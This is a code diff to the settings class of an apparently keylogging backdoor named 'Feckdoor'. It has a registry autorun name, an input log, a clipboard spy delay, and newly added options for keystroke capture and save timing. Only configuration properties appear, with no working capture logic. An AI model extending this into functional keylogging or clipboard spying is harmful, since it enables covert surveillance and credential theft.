@@ -13,6 +13,11 @@
 			get; set;
 		} = @".\Feckdoor.log";
 
+		public string LogTemplate
+		{
+			get; set;
+		} = "{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level:u3}] {Message:lj}{NewLine}{Exception}";
+
 		public string RegistryAutorunName
 		{
 			get; set;
@@ -41,10 +46,20 @@
 			get; set;
 		} = @".\Input.log";
 
-		public bool PreserveCase
+		public bool ShiftPrefix
 		{
 			get; set;
 		}
+
+		public bool SuppressModifierKey
+		{
+			get; set;
+		}
+
+		public bool AutoCapitalize
+		{
+			get; set;
+		} = true;
 
 		public int ClipboardSpyDelay
 		{
@@ -60,6 +75,21 @@
 		{
 			get; set;
 		} = "Unknown executable";
+
+		public int SaveWait
+		{
+			get; set;
+		} = 2000;
+		
+		public int SaveMaxUndone
+		{
+			get; set;
+		} = 20;
+		
+		public int SaveDelay
+		{
+			get; set;
+		} = 100;
 
 		public PlainTextSection PlainText
 		{
